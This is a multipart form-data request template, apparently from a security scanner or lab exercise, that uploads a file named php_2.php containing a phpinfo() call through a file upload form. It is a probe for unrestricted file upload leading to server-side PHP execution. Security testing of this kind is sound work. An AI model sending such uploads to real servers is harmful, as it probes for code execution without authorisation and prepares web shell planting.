--{0}
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
--{0}
Content-Disposition: form-data; name="uploaded"; filename="php_2.php"
Content-Type: application/octet-stream

<?php phpinfo() ?>
--{0}
Content-Disposition: form-data; name="Upload"

Upload
{0}--
